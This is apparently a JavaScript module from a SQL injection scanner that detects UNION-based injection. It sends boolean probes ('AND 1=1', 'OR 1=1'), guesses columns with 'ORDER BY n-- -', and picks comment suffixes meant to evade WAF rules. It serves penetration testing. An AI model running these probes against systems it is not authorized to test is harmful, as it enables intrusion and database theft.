// =====================================================================
// UnionDetector.js —— UNION 注入检测器
// =====================================================================
import { Detector } from '../Detector.js';
import { createDetectionResult } from '../models.js';
import { binaryGuessColumns, colGuessExtra } from '../columnGuess.js';
import { _colGuessCache, colGuessScopeKey } from '../Extractor.js';
import { discoverEchoColumnsDetailed } from '../injection.js';
import { unionDebug } from '../unionDebug.js';
import { commentSuffix as commentSuffixFor } from '../DialectSqlBuilder.js';

// 假阳性门控：参数反射会「原样回显」注入串，导致标记出现在响应即可误报 UNION。
// sqlmap 的做法是先在注入存在性层面确认参数在 SQL 上下文（布尔/报错/时间任一分化），
// 再谈 UNION 回显列定位。此处用一对真假布尔探针作最低成本存在性证明：
//   真探针  {orig} AND 1=1  → 与基线相似（SQL 上下文中恒真）
//   假探针  {orig} AND 1=2  → 与基线性差异/失败（恒假改变结果）
// 参数反射目标（参数只是被当作文本回显）→ 真假探针都只是「输入串变长」，
// 与基线长度差超过容差 → 双双判定不相似 → 门控拒绝 → 不误报。
export class UnionDetector extends Detector {
  constructor() {
    super('union');
  }

  // 布尔探针相似判定（与 BooleanBlindDetector._similar 同套容差逻辑的轻量版）
  // 布尔探针相似判定：字符级差异率（比 LCP 对反射目标更鲁棒——中段 1 个字符差异 + 时间戳
  // 噪声不会让 LCP 崩塌，差异计数准确反映「仅 1 字符不同的反射特征」）。
  _similar(a, b) {
    if (a === b) return true;
    const la = a.length, lb = b.length;
    if (Math.abs(la - lb) > Math.max(24, lb * 0.12)) return false;
    const m = Math.min(la, lb);
    let diffs = 0;
    for (let i = 0; i < m; i++) { if (a[i] !== b[i]) diffs++; }
    if (diffs + Math.abs(la - lb) >= Math.max(la, lb) * 0.15) return false;
    return true;
  }

  /**
   * 注入存在性门控：参数必须证明在 SQL 上下文，才继续 UNION 回显定位。
   *
   * 核心区分（真假探针互相比较，而非各自比基线）：
   *   反射目标：`Results for: ... AND 1=1` vs `... AND 1=2` → 结构高度相似（仅末尾 1 字符不同）→ 拒绝
   *   真实注入：`HAS_RESULTS` vs `NO_RESULTS` → 互相不相似（SQL 真假分化改变响应）→ 通过
   *   无信号：真假都返回基线相同内容 → 相似 → 拒绝
   *
   * 用与 BooleanBlindDetector._similar 同套容差（LCP 85% + 分块兜底）。
   * @returns {Promise<boolean|'inconclusive'>} true=存在注入现象（通过门控）；
   *   false=失败样本（重发仍不可用）或双 200 同态（反射/非 SQL，保守拒绝）；
   *   'inconclusive'=真假探针同态非 200（[D221] 疑似 WAF 收缩，无判据——调用方应继续，
   *   由 ORDER BY 差分自行判决）
   */
  async _gateInjection(ctx, httpClient, target, point, boundary) {
    const orig = point.originalValue || '1';
    // [CRS-FIX 2026-09-09] 尾注选择（原实现为致命 bug，勿回退）：
    // 原逻辑 tamper 开启时固定用 `/*`（本意：躲 WAF 的 comment_dash 规则）。但 MySQL 系方言下
    // **未闭合块注释直接触发语法错误** → 真/假探针双双 500、响应长度完全相同 → _similar=true
    // → 门控误判「参数不在 SQL 上下文」→ UNION 在一切 tamper 开启场景恒 0 检出。
    // 实测（真实 MySQL 8.0.28 + CRS）：`1 AND 1=1/*` 与 `1 AND 1=2/*` 均 status=500 len=269。
    // 修正：改用**行注释符**。MySQL/MariaDB/TiDB 用 `#`（单个非词字符，同样不命中 942460 的
    // \W{4}，兼顾绕 WAF 初衷）；其余方言与 tamper 关闭时保持 `-- -`（既有行为不变）。
    // 与 injection._markerProbe 共用同一判据（DialectSqlBuilder.commentSuffix），消除第二处拷贝
    const commentSuffix = commentSuffixFor(ctx.dbms, {
      tamperEnabled: !!ctx.config?.wafEvasion?.tamper?.enabled,
    });
    const dbg =
      `point=${point.id} boundary=${JSON.stringify(boundary)} suffix=${JSON.stringify(commentSuffix)} ` +
      `tamper=${!!ctx.config?.wafEvasion?.tamper?.enabled}`;
    // AND 型门控（真=恒真 / 假=恒假）
    const and = await this._gateStage(
      ctx,
      httpClient,
      target,
      point,
      `${orig}${boundary} AND 1=1${commentSuffix}`,
      `${orig}${boundary} AND 1=2${commentSuffix}`,
      dbg,
    );
    if (and === 'pass') return true;
    if (and === 'unusable') return false; // 失败样本：宁可不启用 UNION，也不拿网络抖动当注入信号
    if (and === 'reflection') {
    // [P1-FIX 2026-09-10] 空基线降级复判（OR 型）：
    // 参数**原值查不到行**时（失效 id / 已删除记录 / 需鉴权不可见——实测 UA 头注入点
    // `WHERE username='Mozilla'` 恒 0 行），`AND 1=1` 与 `AND 1=2` 双双落在同一个空结果集，
    // 响应完全相同 → 门控误判「参数不在 SQL 上下文」→ UNION 恒不启用（实测 ua 场景只出 error/boolean）。
    // OR 型不受此影响：`OR 1=1` 命中全表（有数据）、`OR 1=2` 回到原空集 → 真假必然分化。
    // 成本：仅在 AND 型判「相似」后才追加 2 个请求（正常场景零额外开销）。
      const or = await this._gateStage(
        ctx,
        httpClient,
        target,
        point,
        `${orig}${boundary} OR 1=1${commentSuffix}`,
        `${orig}${boundary} OR 1=2${commentSuffix}`,
        dbg,
      );
      if (or === 'pass') return true;
      return false; // 'unusable'（失败样本）/ 'reflection'（OR 也同态）/ 'blocked' → 保守拒绝
    }
    // and === 'blocked'：[D221] AND/OR 同族形状（同义式）都会被拦，OR 复判无判据 → 放行。
    // 安全性：列发现阶段的 ORDER BY 差分是固有 SQL 上下文判据——反射点在 ORDER BY 上
    // 同样无差分、列发现不收敛、union 自动中止 ⇒ 假阳防线不因放行而降级。
    // （实证：waf-lab CRS 档 boolean 全拦 + 旧对照判据下 union 恒死，bisect 钉在 D211/D212
    //   归因对照上线后暴露——此前 union 通道靠结构假阳的 error 通道顶替；
    //   [CRS-FIX 2026-09-09] 已修过同族问题之一（tamper `/*` 后缀双 500），
    //   「探针本身被 WAF 收缩」是残留形态。证据链见 CHANGELOG D221。）
    return 'inconclusive';
  }

  /**
   * [D221] 失败样本护栏（自 _gateInjection 提取）：发送后先判可用性，不可用的重发一次。
   *
   * 缺陷：原实现直接 `String((await this.send(...))?.data ?? '')`，把**网络失败**
   * 折成空串参与真假比对。空串 vs 正常页面必然"不相似" ⇒ 门控放行 ⇒
   * 网络抖动被当成 SQL 真假分化，门控本该防的参数反射误报从这里漏出去。
   * 实测：真探针超时 + 假探针正常 ⇒ pass=true（假阳性来源）。
   *
   * 同族检测器早有这道闸（口径统一在 egressOpts.isUnusableResponse）：
   *   BooleanBlindDetector:266/333/431  this.unusableOf(rTrue) || this.unusableOf(rFalse)
   *   TimeBlindDetector:171             this.unusableOf(baseRes) || this.unusableOf(injectRes)
   *   StackedDetector:75/148            !r.__error && r.resp != null
   *   prefilter.js:24 甚至写了纪律「本模块统一用 isUnusableResponse(res)，
   *                                **不要**改回 res == null」——Union 是唯一漏掉的。
   *
   * 为什么是"重发"而不是"直接拒绝"：直接拒绝会把假阳性修成假阴性，
   * 违反「不得降低检出能力」。重发命中失败样本同样无效的场合才拒绝，
   * 与同族检测器同口径。代价：仅在失败时多 1 个请求，正常场景零开销。
   * @param {object} ctx { httpClient, target, point, config, dbms }
   * @param {object} httpClient 引擎共享 HTTP 客户端（走 egress/scope 护栏）
   * @param {object} target 扫描目标（含 url/params/mode）
   * @param {object} point 注入点（含 id/originalValue）
   * @param {string} payload 待发送的探针串（未混淆）
   * @returns {Promise<{res: object, body: string|null}>} body=null = 重发仍不可用，交由调用方保守处理
   */
  async _sendUsable(ctx, httpClient, target, point, payload) {
    const req = this.buildRequest(target, point, this.obfuscateValue(ctx, payload));
    let res = await this.send(httpClient, ctx, req, ctx);
    if (!this.unusableOf(res)) return { res, body: String(res?.data ?? '') };
    unionDebug(`gate 探针失败(${this.unusableOf(res)})，重发一次 payload=${JSON.stringify(payload)}`);
    res = await this.send(httpClient, ctx, req, ctx);
    if (!this.unusableOf(res)) return { res, body: String(res?.data ?? '') };
    return { res, body: null }; // 重发仍失败：交由调用方保守处理
  }

  /**
   * [D221] 单阶段真假判（AND 门控与 OR 复判共用，自 _gateInjection 提取）。
   *
   * 核心区分（真假探针互相比较，而非各自比基线）：
   *   反射目标：`Results for: ... AND 1=1` vs `... AND 1=2` → 结构高度相似（仅末尾 1 字符不同）
   *   真实注入：`HAS_RESULTS` vs `NO_RESULTS` → 互相不相似（SQL 真假分化改变响应）
   *   无信号：真假都返回基线相同内容 → 相似
   * 用与 BooleanBlindDetector._similar 同套容差（LCP 85% + 分块兜底）。
   *
   * @param {object} ctx { httpClient, target, point, config, dbms }
   * @param {object} httpClient 引擎共享 HTTP 客户端（走 egress/scope 护栏）
   * @param {object} target 扫描目标（含 url/params/mode）
   * @param {object} point 注入点（含 id/originalValue）
   * @param {string} truePayload 真探针（恒真形态）
   * @param {string} falsePayload 假探针（恒假形态）
   * @param {string} dbg 门控诊断前缀（point/boundary/suffix/tamper）
   * @returns {Promise<'pass'|'unusable'|'reflection'|'blocked'>}
   *   'pass' = 真假不相似（SQL 真假分化改变了响应，存在注入现象）；
   *   'unusable' = 失败样本（重发仍不可用）——保守拒绝，不得拿网络抖动当注入信号；
   *   'reflection' = 双 200 同态（参数反射 / 非 SQL 上下文；AND 阶段转入 OR 复判）；
   *   'blocked' = 真假相似且**同态非 200**（[D221] 疑似 WAF 收缩：响应无 SQL 真假
   *     信息，既非「反射」也非「有注入」——AND 阶段直接放行，由 ORDER BY 差分
   *     自行判决）。
   */
  async _gateStage(ctx, httpClient, target, point, truePayload, falsePayload, dbg) {
    // 失败样本不参与判定：宁可不启用 UNION，也不能拿网络抖动当注入信号。
    // （此前两侧都失败会因都是 '' 而"恰好"判相似 → 保守拒绝，属巧合正确；
    //   换成单边失败就崩。现改为显式按失败标志判定，不依赖巧合。）
    const t = await this._sendUsable(ctx, httpClient, target, point, truePayload);
    const f = await this._sendUsable(ctx, httpClient, target, point, falsePayload);
    if (t.body === null || f.body === null) {
      unionDebug(`gate ${dbg} 探针不可用（true=${t.body === null} false=${f.body === null}）→ 保守拒绝`);
      return 'unusable';
    }
    // [P0-DIAG 2026-09-10] 门控是 union 唯一静默失败点，输出实际探针与响应长度便于排障
    const similar = this._similar(t.body, f.body);
    unionDebug(
      `gate ${dbg} truePayload=${JSON.stringify(truePayload)} trueLen=${t.body.length} falseLen=${f.body.length} similar=${similar}`
    );
    if (!similar) return 'pass';
    // [D221] 被拦形态判定：真假探针**同态非 200**——典型如 CRS 同义式规则（942130 类）
    // 把 `AND 1=1`/`AND 1=2` 双双 403 成同一个拦截页。此时响应里不含任何 SQL 真假信息：
    // 既不能判「有注入」，也不能判「反射」，属**无判据**而非「不可注入」。
    if (t.res?.status != null && t.res.status === f.res.status && t.res.status !== 200) {
      unionDebug(`gate ${dbg} 真假探针同态 status=${t.res.status}（疑似 WAF 拦截页）→ 无判据`);
      return 'blocked';
    }
    return 'reflection';
  }

  /**
   * @param {object} ctx { httpClient, target, point, dbms, config }
   * @returns {Promise<import('../models.js').DetectionResult>}
   */
  async detect(ctx) {
    const { httpClient, target, point, dbms } = ctx;
    const result = createDetectionResult(point.id, 'union');
    unionDebug(`detect enter point=${point.id} dbms=${dbms}`);
    const maxCols = ctx.config?.maxColumnsGuess ?? 50;
    // [P2-5] --union-cols：用户给定列数（跳过 ORDER BY 二分；0/缺省自动猜测）
    const unionCols = ctx.config?.unionCols ? Number(ctx.config.unionCols) : 0;
    // ★FIX-1：闭合前缀（probeBoundary 探测结果，字符串上下文注入点必需）
    const boundary = point.boundary || '';

    // 基线响应长度，用于判断 ORDER BY 是否超出列数
    const baseReq = this.buildRequest(target, point, point.originalValue || '1');
    const baseline = await this.send(httpClient, ctx, baseReq, ctx);
    const baseLen = String(baseline?.data ?? '').length;

    // 注入存在性门控（防参数反射误报；可经 config.unionSkipGate 关闭）
    // 直连模式（-d）：SQL 模板为自建，参数直进 SQL 无「应用反射输入」概念 → 跳过门控
    const isDirect = target?.mode === 'direct';
    const gateEnabled = !isDirect && ctx.config?.unionSkipGate !== true;
    if (gateEnabled) {
      const gate = await this._gateInjection(ctx, httpClient, target, point, boundary);
      unionDebug(`gate verdict=${gate} point=${point.id}`);
      if (gate === false) {
        return result; // 200 同态（反射 / 非 SQL 上下文）⇒ union 不启用（假阳防线，D221 保持不变）
      }
      // true=真假有差分；'inconclusive'=真假探针同态非 200（疑似 WAF 收缩，无判据）
      // ⇒ 都继续：列发现的 ORDER BY 差分是固有 SQL 上下文判据，反射点在此不收敛、
      // union 自止，故放行不引入新的假阳面（D221）。
    }

    // 1) 猜列数（ORDER BY 二分，请求数 ~log2(maxCols)，取代线性扫描）
    const columns = await binaryGuessColumns(
      (n) => {
        const __t = Date.now();
        return this.send(
          httpClient,
          ctx,
          this.buildRequest(
            target,
            point,
            this.obfuscateValue(ctx, `${point.originalValue || '1'}${boundary} ORDER BY ${n}-- -`)
          ),
          ctx
        ).then((r) => {
          unionDebug(`colGuess n=${n} status=${r?.status} len=${String(r?.data ?? '').length} 耗时=${Date.now() - __t}ms`);
          return r;
        });
      },
      { baseLen, maxCols, cache: _colGuessCache, cacheKey: colGuessScopeKey(target, point?.id, colGuessExtra(ctx, boundary)), fixed: unionCols }
    );

    // [2026-10-01] capped（判据失效顶到上限）→ null：UNION 照用荒谬列数只会空转，
    // 按 binaryProbe 调用方约定放弃 UNION（不误报、不浪费请求）。
    if (columns == null) {
      unionDebug(`colGuess capped（判据失效） point=${point.id} → UNION 放弃`);
      return result;
    }

    // 2) 用标记字符串定位回显列（文本标记优先；严格类型库 / INT 回显列自动落数字标记双族交叉确认）
    // 修复对标 sqlmap 差距 D3：'SQLISCANNER<i>' 落在 INT 列上在 MSSQL/Oracle/PG 报类型错误 → 原先完全漏检
    const located = await discoverEchoColumnsDetailed(httpClient, ctx, columns, boundary);
    unionDebug(
      `columns=${columns} located.cols=${JSON.stringify(located.cols)} ` +
        `numeric=${JSON.stringify(located.numericCols)} style=${located.style}`,
    );
    const unionPayload = located.evidencePayload;
    const hitCols = located.cols.length > 0 ? located.cols : located.numericCols;

    if (hitCols.length > 0) {
      result.vulnerable = true;
      result.dbms = dbms;
      const styleNote = located.style === 'numeric' ? '，数值型回显列（INT 兼容）' : '';
      result.evidence = `UNION 注入成功，回显列：${hitCols.join(',')}（列数 ${columns}${styleNote}）`;
      result.payloads = [unionPayload, `${point.originalValue || '1'}${boundary} ORDER BY ${columns}-- -`];
      point.confirmed = true;
      point.technique = 'union';
      point.dbms = dbms;
      // 记录回显列与列数，供 Extractor/DBFingerprinter 复用（避免各自硬编第 2 列）
      // 注意：echoCols 保持「可回显文本的列」语义（数值列无法回显文本，拖库/版本提取不可用）；
      // 仅数值回显命中时置空数组——UNION 注入本身已确认（confirmed=true），但提取走不了文本列
      point.echoCols = located.cols;
      point.columns = columns;
    }
    return result;
  }
}

export default UnionDetector;
